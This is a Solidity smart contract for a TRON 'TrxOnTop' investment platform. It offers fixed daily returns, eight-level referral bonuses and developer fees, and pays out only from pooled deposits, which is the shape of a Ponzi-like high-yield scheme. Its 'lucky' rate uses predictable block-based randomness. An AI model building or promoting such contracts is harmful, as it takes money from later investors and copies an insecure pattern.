//SourceUnit: TrxOnTop_Lite.sol

pragma solidity 0.5.14;

/* ---> (www.trxontop.com/lite)  | (c) 2020 Developed by TRX-ON-TOP TEAM TrxOnTop_Lite.sol | La Habana - Cuba <------ */

contract TrxOnTop_Lite {
    struct InfinitePlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 insuredDeposit;
        uint256 dividends; 
        uint256 depositsCount;
        uint256 withdrawn;
    }  
    
    struct LuckyPlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 tarif;
        uint256 lifeTime;
        uint256 dividends;
        uint256 depositsCount;
        uint256 depositStartTime; 
        uint256 depositFinishTime;
        uint256 withdrawn;
    }      
  
    struct Player {
        InfinitePlan[1] infinitePlan;
        LuckyPlan[1] luckyPlan;
        address upline;  
        uint256 id;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_withdrawn;
        uint256 total_withdrawnReferral;
        uint256 total_match_bonus;
        uint256 total_invested;
        uint256 firstDep_Time;
        mapping(uint8 => uint256) structure;
    }
 
    uint256 private infinitePlanDeposit_StartTime;
    uint256 private luckyPlanDeposit_StartTime;
   
    address payable private dev_0;
    address payable private dev_1;
    address payable private dev_2;
    uint256 private contract_CreateTime;
    uint256 private contract_StartTime;
    uint256 private invested;
	uint256 private investors;
    uint256 private totalWithdrawn;
    uint256 private totalWithdrawnReferral;
    uint256 private match_bonus;
    uint256 private infiniteDepositCount;
    uint256 private luckyDepositCount;
    uint256 private insuredBalance;
    uint256 private luckyPlanLifetime;
    
    uint256 private constant CONTRACT_TIMETOSTART             = 4 * 60 * 60;
    uint256 private constant LUCKYPLAN_DEPOSIT_TIMETOSTART    = 4 * 60 * 60;
    uint256 private constant INFINITEPLAN_DEPOSIT_TIMETOSTART = 0 * 60 * 60;
    uint256 private constant DEV_FEE              = 50;
    uint256 private constant INFINITE_BASIC_TARIF = 1E6;
    uint256 private constant MIN_INFINITE_INVEST  = 25E6;
    uint256 private constant MAX_INFINITE_INVEST  = 3000E6;
    uint256 private constant SECURE_PERCENT       = 20;
    uint256[] private LUCKYPLAN_LIFETIME          = [3, 5, 7];
    uint256[] private LUCKYPLAN_TARIF             = [350, 420, 210, 250, 150, 180];
    uint256[] private REF_BONUSES                 = [30, 20, 10, 8, 6, 4, 2, 1];
    
    mapping(address => Player) private players;

    event Upline(address indexed addr, address indexed upline);
    event NewInfiniteDeposit(address indexed addr, uint256 amount);
    event NewLuckyDeposit(address indexed addr, uint256 amount);
    event NewReactiveLuckyPlan(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event WithdrawInfinite(address indexed addr, uint256 amount);
    event WithdrawSecured(address indexed addr, uint256 amount);
    event WithdrawLucky(address indexed addr, uint256 amount);
    event WithdrawReferral(address indexed addr, uint256 amount);
    event NewSecureInfDeposit(address indexed addr, uint256 amount);

    constructor(address payable dev1, address payable dev2) public {
        dev_0 = msg.sender;
        dev_1 = dev1;
        dev_2 = dev2;
        contract_CreateTime = now;
        contract_StartTime = contract_CreateTime + CONTRACT_TIMETOSTART;
        infinitePlanDeposit_StartTime = contract_CreateTime + INFINITEPLAN_DEPOSIT_TIMETOSTART;
        luckyPlanDeposit_StartTime = contract_CreateTime + LUCKYPLAN_DEPOSIT_TIMETOSTART;
    }
    
    modifier onlyOwner {
        require(msg.sender == dev_0 || msg.sender == dev_1 || msg.sender == dev_2, "Only owner can call this function");
        _;
    } 
    
    function refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < REF_BONUSES.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * REF_BONUSES[i] / 1000;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
            up = players[up].upline;
        }
    }

    function setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != dev_0) {
             if(players[_upline].infinitePlan[0].activeDeposit == 0) {
                 _upline = dev_1;
             }
            players[_addr].upline = _upline;
            emit Upline(_addr, _upline);
            for(uint8 i = 0; i < REF_BONUSES.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }
    
    function getLuckyNumber(uint256 fr, uint256 to, uint256 mod) view private returns (uint256) { 
        uint256 A = minZero(to, fr) + 1;
        uint256 B = fr;
        uint256 value = uint256(uint256(keccak256(abi.encode(block.timestamp * mod, block.difficulty * mod)))%A) + B; 
        return value;
    }     
    
    function getLuckyPlanLifetime(uint256 plan) view private returns (uint256) { 
        uint256 val = 0;
        if (plan == 50E6)  {val = LUCKYPLAN_LIFETIME[0];} else 
        if (plan == 100E6) {val = LUCKYPLAN_LIFETIME[1];} else 
        if (plan == 200E6) {val = LUCKYPLAN_LIFETIME[2];}
        return val * 24 * 60 * 60;
    }    
    
    function getLuckyPlanTarif(uint256 plan, uint256 id) view private returns (uint256) { 
        uint256 val = 0;
        if (plan == 50E6)  {val = getLuckyNumber(LUCKYPLAN_TARIF[0], LUCKYPLAN_TARIF[1], id);} else 
        if (plan == 100E6) {val = getLuckyNumber(LUCKYPLAN_TARIF[2], LUCKYPLAN_TARIF[3], id);} else 
        if (plan == 200E6) {val = getLuckyNumber(LUCKYPLAN_TARIF[4], LUCKYPLAN_TARIF[5], id);}
        return val;
    }   
    
    function infinitePlanDeposit(address _upline) external payable {
        Player storage player = players[msg.sender];
        
        require(now >= infinitePlanDeposit_StartTime, "Infinite Plan is not available yet");
        require(msg.value >= MIN_INFINITE_INVEST, "Minimum to invest is 25 TRX");
        require(msg.value <= minZero(MAX_INFINITE_INVEST, player.infinitePlan[0].activeDeposit), "Max. Active Deposits is 3000 TRX");
    
        setUpline(msg.sender, _upline);

        if (player.infinitePlan[0].depositsCount == 0) {
            player.firstDep_Time = now;
            player.last_payout = maxVal(now, contract_StartTime);
            investors++;
            player.id = investors;
        } else {
            update_InfinitePlanInterestProfit(msg.sender);
        }

        player.infinitePlan[0].depositsCount++;
        infiniteDepositCount ++;
        invested += msg.value;
        player.infinitePlan[0].activeDeposit += msg.value;
        player.infinitePlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;

        payContractFee(msg.value);
       
        refPayout(msg.sender, msg.value);
        
        emit NewInfiniteDeposit(msg.sender, msg.value);
    }
    
    function giveLuckyPlan(address userAddress) external payable onlyOwner {  
        Player storage player = players[userAddress];
        require(now >= luckyPlanDeposit_StartTime, "Lucky Plan is not available yet");
        require(player.luckyPlan[0].activeDeposit == 0, "Only 1 Lucky Plan is allowed at the same time");
        
        require((msg.value == 50E6  && player.infinitePlan[0].activeDeposit >= 50E6)  || 
                (msg.value == 100E6 && player.infinitePlan[0].activeDeposit >= 100E6) || 
                (msg.value == 200E6 && player.infinitePlan[0].activeDeposit >= 200E6));  
                
        luckyDepositCount++;
        player.luckyPlan[0].depositsCount++;
        invested += msg.value;
        player.luckyPlan[0].activeDeposit = msg.value;
        player.luckyPlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;
        player.luckyPlan[0].tarif = getLuckyPlanTarif(msg.value, player.id);
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].lifeTime = getLuckyPlanLifetime(msg.value);
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + player.luckyPlan[0].lifeTime;

        payContractFee(msg.value);
        emit NewLuckyDeposit(msg.sender, msg.value);                
    }       
    
    function luckyPlanDeposit() external payable {
        Player storage player = players[msg.sender];
        require(now >= luckyPlanDeposit_StartTime, "Lucky Plan is not available yet");
        require(player.luckyPlan[0].activeDeposit == 0, "Only 1 Lucky Plan is allowed at the same time");
        
        require((msg.value == 50E6  && player.infinitePlan[0].activeDeposit >= 50E6)  || 
                (msg.value == 100E6 && player.infinitePlan[0].activeDeposit >= 100E6) || 
                (msg.value == 200E6 && player.infinitePlan[0].activeDeposit >= 200E6));
       
        luckyDepositCount++;
        player.luckyPlan[0].depositsCount++;
        invested += msg.value;
        player.luckyPlan[0].activeDeposit = msg.value;
        player.luckyPlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;
        player.luckyPlan[0].tarif = getLuckyPlanTarif(msg.value, player.id);
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].lifeTime = getLuckyPlanLifetime(msg.value);
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + player.luckyPlan[0].lifeTime;

        payContractFee(msg.value);
        emit NewLuckyDeposit(msg.sender, msg.value);
    }    
    
    function update_InfinitePlanInterestProfit(address _addr) private {
        Player storage player = players[_addr];
        uint256 amount = getInfinitePlan_InterestProfit(_addr);
        player.infinitePlan[0].dividends += amount;
        player.last_payout = now;
    }   
    
    function infinitePlanWithdraw() external {
        Player storage player = players[msg.sender];
        
        uint contractBalance = getAvailableContractBalance();
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 amount = player.infinitePlan[0].dividends;
       
        require(player.infinitePlan[0].depositsCount > 0);
        require(amount >= player.infinitePlan[0].recordDeposit);
       
        if (player.infinitePlan[0].insuredDeposit > 0) {
           uint256 sec_amount = player.infinitePlan[0].insuredDeposit;
           player.infinitePlan[0].insuredDeposit = 0;
           uint256 ib = insuredBalance; 
           insuredBalance = minZero(ib, sec_amount);
           amount -= sec_amount;
           player.total_withdrawn += sec_amount;
           player.infinitePlan[0].withdrawn += sec_amount;
           totalWithdrawn += sec_amount;           
           msg.sender.transfer(sec_amount);
           emit WithdrawSecured(msg.sender, sec_amount); 
           
           player.infinitePlan[0].dividends = amount; 
           player.infinitePlan[0].activeDeposit = 0;
           player.infinitePlan[0].recordDeposit = 0;
           if (contractBalance >= amount) {
               player.infinitePlan[0].dividends = 0;
               player.total_withdrawn += amount;
               player.infinitePlan[0].withdrawn += amount;
               totalWithdrawn += amount;
               msg.sender.transfer(amount);
               emit WithdrawInfinite(msg.sender, amount); 
           }           
        } else {
           if (contractBalance >= amount) { 
               player.infinitePlan[0].dividends = 0; 
               player.infinitePlan[0].activeDeposit = 0;
               player.infinitePlan[0].recordDeposit = 0;
               player.total_withdrawn += amount;
               player.infinitePlan[0].withdrawn += amount;
               totalWithdrawn += amount;
               msg.sender.transfer(amount);
               emit WithdrawInfinite(msg.sender, amount); 
           } 
        }
    }
    
    function luckyPlanWithdraw() external {
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].depositFinishTime < now, "Plan not finished yet");
        
        uint d_amount = minZero(getLuckyPlan_InterestProfit(msg.sender), player.luckyPlan[0].activeDeposit); 
        uint w_amount = player.luckyPlan[0].activeDeposit;
        
        uint contractBalance = getAvailableContractBalance();
        require(contractBalance >= w_amount, "Contract balance < Interest Profit");
        
        player.luckyPlan[0].activeDeposit = 0;
        player.luckyPlan[0].tarif = 0;
        player.infinitePlan[0].dividends += d_amount;
        player.total_withdrawn += w_amount;
        player.luckyPlan[0].withdrawn += w_amount;
        totalWithdrawn += w_amount;  
        
        msg.sender.transfer(w_amount);
        emit WithdrawLucky(msg.sender, w_amount);
    }     
    
    function reactiveLuckyPlan() external {
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].depositFinishTime < now, "Plan not finished yet");
        
        uint d_amount = minZero(getLuckyPlan_InterestProfit(msg.sender), player.luckyPlan[0].activeDeposit); 
                
        require((player.luckyPlan[0].activeDeposit == 50E6  && player.infinitePlan[0].activeDeposit >= 50E6)  || 
                (player.luckyPlan[0].activeDeposit == 100E6 && player.infinitePlan[0].activeDeposit >= 100E6) || 
                (player.luckyPlan[0].activeDeposit == 200E6 && player.infinitePlan[0].activeDeposit >= 200E6));
  
        player.infinitePlan[0].dividends += d_amount;
        player.luckyPlan[0].depositsCount++;
        luckyDepositCount++;
        player.luckyPlan[0].recordDeposit += player.luckyPlan[0].activeDeposit;
        player.total_invested += player.luckyPlan[0].activeDeposit;
        player.luckyPlan[0].tarif = getLuckyPlanTarif(player.luckyPlan[0].activeDeposit, player.id);
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + player.luckyPlan[0].lifeTime;
        payContractFee(player.luckyPlan[0].activeDeposit);
        emit NewReactiveLuckyPlan(msg.sender, player.luckyPlan[0].activeDeposit);
    }     
    
    function referralWithdraw() external {
        Player storage player = players[msg.sender];
        uint contractBalance = getAvailableContractBalance();
        require(player.infinitePlan[0].depositsCount > 0, "Active deposit is require");
        require(contractBalance >= player.match_bonus, "Contract balance < Referral bonus");

        uint256 amount = player.match_bonus;
        player.match_bonus = 0;

        player.total_withdrawn += amount;
        player.total_withdrawnReferral += amount;
        totalWithdrawnReferral += amount;
        totalWithdrawn += amount;

        msg.sender.transfer(amount);
        emit WithdrawReferral(msg.sender, amount);
    }
    
    function getInfinitePlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 fr = player.last_payout;
        if (contract_StartTime > now) {
          fr = now; 
        }
        uint256 Tarif = INFINITE_BASIC_TARIF;
        uint256 to = now;
        if(fr < to) {
            value = player.infinitePlan[0].activeDeposit * (to - fr) * Tarif / 86400 / 100E6;
        } else {
            value = 0;
        }
        return value;
    }
  
    function getLuckyPlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        if (player.luckyPlan[0].activeDeposit > 0) {
          if (now < player.luckyPlan[0].depositFinishTime) {
               uint256 fr = player.luckyPlan[0].depositStartTime;
               uint256 to = now;
               value = player.luckyPlan[0].activeDeposit * (to - fr) * player.luckyPlan[0].tarif / 86400 / 1000;
          } else {
            value = player.luckyPlan[0].activeDeposit * player.luckyPlan[0].lifeTime * player.luckyPlan[0].tarif / 86400 / 1000;
          } 
        } else {
            value = 0;
        }
        return value;
    } 
    
    function secureInfiniteInvesment() external payable { 
        require(now >= infinitePlanDeposit_StartTime);
        Player storage player = players[msg.sender];  
        uint256 sec_amount = minZero(player.infinitePlan[0].recordDeposit, player.infinitePlan[0].insuredDeposit);
        require(sec_amount > 0 && msg.value == sec_amount * SECURE_PERCENT / 100);
        require(getAvailableContractBalance() > sec_amount);
        player.infinitePlan[0].insuredDeposit += sec_amount;
        insuredBalance += sec_amount;
        emit NewSecureInfDeposit(msg.sender, sec_amount);
    }    

    function payContractFee(uint256 val) private {
        uint256 dev_amount = (val * DEV_FEE) / 1000;
        dev_1.transfer(dev_amount);
        dev_2.transfer(dev_amount);
    }
    
    function minZero(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a - b; 
        } else {
           return 0;    
        }    
    }   
    
    function maxVal(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a; 
        } else {
           return b;    
        }    
    }
    
    function minVal(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return b; 
        } else {
           return a;    
        }    
    }
    
	function getContractBalance() internal view returns (uint256) {
		return address(this).balance;
	}   
	
	function getAvailableContractBalance() internal view returns (uint256) {
		return minZero(address(this).balance, insuredBalance);
	}  
    
    function userGeneralInfo(address _addr) view external returns(uint256 _id, uint256 _totalInvested, uint256 _totalWithdrawn, uint256 _total_WithdrawnReferral, uint256 _totalMatchBonus, uint256 _matchBonus, uint256 _runningTime, uint256[8] memory _structure) {
        Player storage player = players[_addr];
        
        uint256 runningTime = 0;
        if (player.total_invested > 0) {
         runningTime = now - player.firstDep_Time;
        }
        
        for(uint8 i = 0; i < REF_BONUSES.length; i++) {
            _structure[i] = player.structure[i];
        }
        return (
            player.id,
            player.total_invested,
            player.total_withdrawn,
            player.total_withdrawnReferral,
            player.total_match_bonus,
            player.match_bonus,
            runningTime,
            _structure
        );    
    }  
    
    function userInfinitePlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _dividends, uint256 _depositsCount, uint256 _withdrawn, uint256 _insuredDeposit) {
        Player storage player = players[_addr];
        return (
            player.infinitePlan[0].activeDeposit,
            player.infinitePlan[0].recordDeposit,
            player.infinitePlan[0].dividends + getInfinitePlan_InterestProfit(_addr),
            player.infinitePlan[0].depositsCount,
            player.infinitePlan[0].withdrawn,
            player.infinitePlan[0].insuredDeposit
        );  
    }    
    
    function userLuckyPlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _tarif, uint256 _dividends, uint256 _depositsCount, uint256 _withdrawn, uint256 _nextWithdraw) {
        Player storage player = players[_addr];
        return (
            player.luckyPlan[0].activeDeposit,
            player.luckyPlan[0].recordDeposit,
            player.luckyPlan[0].tarif,
            getLuckyPlan_InterestProfit(_addr),
            player.luckyPlan[0].depositsCount,
            player.luckyPlan[0].withdrawn,
            minZero(player.luckyPlan[0].depositFinishTime, now)
        );  
    }  
    
    function contractInfo() view external returns(uint256 _invested, uint256 _investors, uint256 _matchBonus, uint256 _infiniteDepositCount, uint256 _luckyDepositCount, uint256 _insuredBalance, uint256 _contractIniTime, uint256 _infiniteDepIniTime, uint256 _luckyDepIniTime) {
        return (
            invested,
            investors,
            match_bonus,
            infiniteDepositCount,
            luckyDepositCount,
            insuredBalance,
            minZero(contract_StartTime, now),
            minZero(infinitePlanDeposit_StartTime, now),
            minZero(luckyPlanDeposit_StartTime, now)
        );
    }
    
}